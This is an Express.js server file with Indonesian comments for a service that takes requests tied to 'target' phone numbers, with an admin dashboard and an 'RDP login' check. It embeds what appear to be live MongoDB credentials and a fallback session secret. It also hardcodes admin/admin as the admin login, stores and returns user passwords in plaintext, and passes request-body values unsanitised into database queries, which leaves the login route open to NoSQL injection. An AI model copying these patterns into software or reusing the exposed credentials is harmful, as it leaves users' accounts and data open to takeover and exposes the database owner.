const express = require('express');
const session = require('express-session');
const mongoose = require('mongoose');
const path = require('path');

const app = express();

// === KONEKSI MONGODB ===
const MONGODB_URI = process.env.MONGODB_URL || 'mongodb+srv://inklusiteknologi:EhJayo84M9IxUTd@inklusiteknologi.g9awxur.mongodb.net/inklusiteknologi?retryWrites=true&w=majority';
mongoose.connect(MONGODB_URI);

// === MODEL ===
const User = require('./models/User');
const WaitingList = require('./models/PendingUser'); // Model untuk antrian

// === MIDDLEWARE ===
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// Session untuk Railway & localhost
app.use(session({
    secret: process.env.SESSION_SECRET || 'InklusiTeknologi2025!@#',
    resave: false,
    saveUninitialized: true,
    cookie: {
        secure: process.env.NODE_ENV === 'production',
        httpOnly: true,
        sameSite: 'lax',
        maxAge: 1000 * 60 * 60 * 24
    },
    proxy: true
}));

// === MIDDLEWARE: Proteksi Admin ===
function requireAdmin(req, res, next) {
    if (!req.session.admin) {
        return res.redirect('/login');
    }
    next();
}

// === ROUTE: LANDING PAGE USER ===
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'User', 'index.html'));
});

// === API: KIRIM KE ANTRIAN (WAITING ROOM) ===
app.post('/api/pending', async (req, res) => {
    const { name, phoneNumberTarget, service } = req.body;
    try {
        if (!name || !phoneNumberTarget || !service) {
            return res.status(400).json({ message: 'Semua field wajib diisi' });
        }
        const newPending = new WaitingList({
            name,
            phoneNumberTarget,
            username: '',
            password: '',
            service
        });
        await newPending.save();
        res.json({ message: 'Permohonan berhasil dikirim. Menunggu persetujuan admin.' });
    } catch (err) {
        console.error('Error antrian:', err);
        res.status(400).json({ message: 'Gagal mengirim permohonan' });
    }
});

// === API: AMBIL DAFTAR ANTRIAN ===
app.get('/api/pending', requireAdmin, async (req, res) => {
    try {
        const pendingList = await WaitingList.find({}).sort({ submittedAt: -1 });
        res.json(pendingList);
    } catch (err) {
        res.status(500).json({ message: 'Gagal memuat antrian' });
    }
});

// === API: HAPUS DARI ANTRIAN ===
app.delete('/api/pending/:id', requireAdmin, async (req, res) => {
    try {
        await WaitingList.findByIdAndDelete(req.params.id);
        res.json({ message: 'Permohonan berhasil dihapus' });
    } catch (err) {
        res.status(500).json({ message: 'Gagal menghapus permohonan' });
    }
});

// === API: CEK NOMOR TARGET ===
app.post('/api/user/check-target', async (req, res) => {
    const { phone } = req.body;
    if (!phone) {
        return res.status(400).json({ success: false, message: 'Nomor tidak boleh kosong' });
    }
    try {
        const user = await User.findOne({ phoneNumberTarget: phone, role: 'user' });
        if (!user) {
            return res.status(404).json({ success: false, message: 'Nomor target belum diaktifkan oleh admin' });
        }
        req.session.userId = user._id;
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// === API: AMBIL DATA USER (untuk proses, proses2, proses3) ===
app.get('/api/user/me', async (req, res) => {
    if (!req.session.userId) {
        return res.status(401).json({ message: 'Unauthorized' });
    }
    try {
        const user = await User.findById(req.session.userId);
        if (!user) return res.status(404).json({ message: 'User not found' });
        res.json(user);
    } catch (err) {
        res.status(500).json({ message: 'Server error' });
    }
});

// === API: VALIDASI RDP LOGIN (PENTING! UNTUK HALAMAN PROSES) ===
app.post('/api/user/login-rdp', async (req, res) => {
    const { username, password } = req.body;
    if (!username || !password) {
        return res.status(400).json({ success: false, message: 'Username dan password wajib diisi' });
    }
    try {
        const user = await User.findOne({ username, password, role: 'user' });
        if (user) {
            req.session.userId = user._id;
            return res.json({ success: true });
        } else {
            return res.status(401).json({ success: false, message: 'Kredensial tidak valid' });
        }
    } catch (err) {
        console.error('Error RDP login:', err);
        return res.status(500).json({ success: false, message: 'Server error' });
    }
});

// === LOGIN ADMIN ===
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    if (username === 'admin' && password === 'admin') {
        req.session.admin = true;
        return res.json({ success: true });
    }
    return res.status(401).json({ success: false, message: 'Invalid credentials' });
});

// === LOGOUT ADMIN ===
app.post('/logout', (req, res) => {
    req.session.destroy();
    res.json({ success: true });
});

// === HALAMAN LOGIN & DASHBOARD ADMIN ===
app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'Admin', 'login.html'));
});
app.get('/admin', requireAdmin, (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'Admin', 'index.html'));
});

// === API: MANAJEMEN USER AKTIF (ADMIN) ===
app.get('/api/users', requireAdmin, async (req, res) => {
    try {
        // ✅ Tampilkan password untuk admin (agar bisa diedit)
        const users = await User.find({ role: 'user' });
        res.json(users);
    } catch (err) {
        res.status(500).json({ message: 'Server error' });
    }
});

app.post('/api/users', requireAdmin, async (req, res) => {
    const { username, password, name, phoneNumberTarget, service } = req.body;
    try {
        if (!username || !password || !name || !phoneNumberTarget || !service) {
            return res.status(400).json({ message: 'Semua field wajib diisi' });
        }
        const existing = await User.findOne({ username });
        if (existing) {
            return res.status(400).json({ message: 'Username sudah digunakan' });
        }
        const newUser = new User({ username, password, name, phoneNumberTarget, service, role: 'user' });
        await newUser.save();
        res.json({ message: 'User berhasil ditambahkan' });
    } catch (err) {
        res.status(400).json({ message: 'Gagal menambahkan user' });
    }
});

app.put('/api/users/:id', requireAdmin, async (req, res) => {
    const { username, password, name, phoneNumberTarget, service } = req.body;
    try {
        const existing = await User.findOne({ username, _id: { $ne: req.params.id } });
        if (existing) {
            return res.status(400).json({ message: 'Username sudah digunakan' });
        }
        await User.findByIdAndUpdate(req.params.id, { username, password, name, phoneNumberTarget, service });
        res.json({ message: 'User berhasil diperbarui' });
    } catch (err) {
        res.status(400).json({ message: 'Gagal memperbarui user' });
    }
});

app.delete('/api/users/:id', requireAdmin, async (req, res) => {
    try {
        await User.findByIdAndDelete(req.params.id);
        res.json({ message: 'User berhasil dihapus' });
    } catch (err) {
        res.status(500).json({ message: 'Gagal menghapus user' });
    }
});

// === HALAMAN USER ===
app.get('/proses', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'User', 'proses.html'));
});
app.get('/proses2', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'User', 'proses2.html'));
});
app.get('/proses3', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'User', 'proses3.html'));
});
app.get('/prosesend', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'User', 'prosesend.html'));
});

// === JALANKAN SERVER ===
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`✅ Server berjalan di http://localhost:${PORT}`);
});